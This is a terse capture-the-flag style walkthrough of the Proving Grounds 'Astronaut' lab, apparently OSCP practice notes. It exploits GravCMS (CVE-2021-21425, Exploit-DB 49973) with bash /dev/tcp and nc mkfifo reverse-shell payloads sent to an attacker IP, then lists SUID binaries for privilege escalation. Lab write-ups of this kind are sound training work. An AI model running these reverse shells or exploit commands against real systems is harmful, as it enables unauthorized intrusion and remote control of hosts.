---
layout: post
title:  "Write Up: Proving Grounds Practice - Astronaut"
date:   2024-07-24 19:40:31 -0400
categories: oscp proving-grounds TJNull
---


192.168.174.12
 
============================================================================================================================
port 80

http://192.168.174.12/grav-admin/


└─$ searchsploit -m 49973.py 
  Exploit: GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) (2)
      URL: https://www.exploit-db.com/exploits/49973
     Path: /usr/share/exploitdb/exploits/php/webapps/49973.py
    Codes: N/A
 Verified: True
File Type: ASCII text, with very long lines (429)
Copied to: /home/kali/offsec/pg-practice/Astronaut/49973.py


echo -ne "bash -i >& /dev/tcp/192.168.45.213/4444 0>&1" | base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIxMy80NDQ0IDA+JjE=



trying https://github.com/CsEnox/CVE-2021-21425

python3 exploit.py -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.213 4444 >/tmp/f' -t http://192.168.174.12/grav-admin

=====================================================================================================
alex


$ find / -perm -u=s 2>/dev/null | grep -v '^/proc|^/run|^/sys|^/snap'
/snap/core20/1852/usr/bin/chfn
/snap/core20/1852/usr/bin/chsh
/snap/core20/1852/usr/bin/gpasswd
/snap/core20/1852/usr/bin/mount
/snap/core20/1852/usr/bin/newgrp
/snap/core20/1852/usr/bin/passwd
/snap/core20/1852/usr/bin/su
/snap/core20/1852/usr/bin/sudo
/snap/core20/1852/usr/bin/umount
/snap/core20/1852/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1852/usr/lib/openssh/ssh-keysign
/snap/core20/1611/usr/bin/chfn
/snap/core20/1611/usr/bin/chsh
/snap/core20/1611/usr/bin/gpasswd
/snap/core20/1611/usr/bin/mount
/snap/core20/1611/usr/bin/newgrp
/snap/core20/1611/usr/bin/passwd
/snap/core20/1611/usr/bin/su
/snap/core20/1611/usr/bin/sudo
/snap/core20/1611/usr/bin/umount
/snap/core20/1611/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1611/usr/lib/openssh/ssh-keysign
/snap/snapd/18596/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/at
/usr/bin/su
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/php7.4
/usr/bin/gpasswd




